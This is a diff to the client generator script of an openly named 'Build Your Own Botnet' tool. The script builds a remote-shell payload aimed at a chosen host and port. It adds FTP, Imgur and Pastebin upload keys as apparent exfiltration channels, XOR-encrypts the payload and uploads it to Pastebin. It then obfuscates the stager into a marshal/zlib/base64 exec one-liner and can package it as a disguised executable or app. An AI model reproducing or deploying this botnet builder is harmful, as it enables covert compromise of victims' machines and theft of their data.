@@ -13,6 +13,7 @@ import json
 import zlib
 import base64
 import urllib
+import urllib2
 import marshal
 import colorama
 import argparse
@@ -25,7 +26,7 @@ except:
     from .modules import security, util
 
 
-colorama.init(autoreset=True)
+colorama.init(autoreset=False)
 
 
 def exe(options, filename):
@@ -79,24 +80,27 @@ def app(options, filename):
 
 
 def py(options, payload='modules/payload.py', stager='modules/stager.py', **kwargs):
-
-        key = base64.b64encode(os.urandom(16))
+        api = {}
+        for k,v in kwargs.items():
+            if k in ('imgur', 'ftp', 'paste'):
+                if v:
+                    api[k] = v.split(',')
             
+        key = base64.b64encode(os.urandom(16))
+
         if options.name:
             path = options.name
             if not path.endswith('.py'):
                 path += '.py'
         else:
-            path    = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', 'byob_%s.py' % util.variable(3))
+            path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', 'byob_%s.py' % util.variable(3))
 
         with open(payload, 'r') as fp:
-            payload = fp.read()
-            
-        with open(stager, 'r') as fp:
-            stager  = fp.read().replace('__KEY__', key)
+            payload = fp.read()            
 
-        api     = util.pastebin('\n'.join([options.url, options.api]))
-        payload = payload + "\n\nif __name__ == '__main__':\n    shell = Shell(api='{}')\n    shell.run()".format(api)
+        host    = options.host
+        port    = options.port
+        payload = payload + "\n\nif __name__ == '__main__':\n    _shell = shell(host='{}', port={}, **{})\n    _shell.run()".format(host, port, json.dumps(api))
         code    = security.encrypt_xor(payload, base64.b64decode(key), block_size=8, key_size=16, num_rounds=32, padding='\x00')
         diff    = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))
 
@@ -105,45 +109,45 @@ def py(options, payload='modules/payload.py', stager='modules/stager.py', **kwar
 
         payload = code
         new_url = util.pastebin(payload)
-        kwargs.update({"payload": new_url})
 
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
         print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes uploaded to: {}".format(len(payload), new_url).ljust(80 - len("[+] ")))
 
-        stager += "\nif __name__ == '__main__':\n    _ = main(payload='{}')".format(new_url)
-        code    = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
+        with open(stager, 'r') as fp:
+            stager  = fp.read().replace('__KEY__', key).replace('__PAYLOAD__', new_url)
+            
+        code    = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
         diff    =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
-
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
         print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")))
 
         stager  = code
-
         with file(path, 'w') as fp:
             fp.write(stager)
-
+            
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " +  colorama.Fore.RESET + "Client stager generation complete")
         print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes written to file: {})".format(len(stager), path).ljust(80 - len("[+] ")))   
 
         if options.type == 'exe':
             path = exe(options, path)
-            
         elif options.type == 'app':
             path = app(options, path)
-
         return path
 
     
-def main(*args, **kwargs):
-        print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\tClient | Build Your Own Botnet\n")
-        parser = argparse.ArgumentParser(prog='client.py', usage='client.py {py,exe,app} host port [options]', description="Client Generator (Build Your Own Botnet)", version='0.4.7')
+def main():
+        parser = argparse.ArgumentParser(prog='client.py', description="Client Generator (Build Your Own Botnet)", version='0.4.7')
         parser.add_argument('type', action='store', help='python, executable, app bundle', choices=['py','exe','app'])
-        parser.add_argument('--api-url', dest='url', action='store', type=str, help='API endpoint for locating dynamic servers', required=True)
-        parser.add_argument('--api-key', dest='api', action='store', type=str, help='API key to use the API endpoint', required=True)
-        parser.add_argument('--name', dest='name', action='store', help='output filename')
-        parser.add_argument('--icon', dest='icon', action='store',choices=['java', 'flash', 'chrome', 'firefox', 'safari'])
+        parser.add_argument('host', action='store', type=str, help='server host')
+        parser.add_argument('port', action='store', type=int, help='server port')
+        parser.add_argument('--ftp', action='store', type=str, help='FTP host, username, password')
+        parser.add_argument('--name', action='store', help='output file base name')
+        parser.add_argument('--icon', action='store', help='*.ico, *.png, *.icns image file')
+        parser.add_argument('--imgur', action='store', type=str, help='Imgur API key')
+        parser.add_argument('--paste', action='store', type=str, help='Pastebin API key')
         options = parser.parse_args()
+        kwargs  = dict(options._get_kwargs())
         return py(options, **kwargs)
 
 if __name__ == '__main__':
-    main(**{"modules": "https://pastebin.com/raw/Z5z5cjny","api_key":"https://pastebin.com/raw/uYGhnVqp"})
+    main()
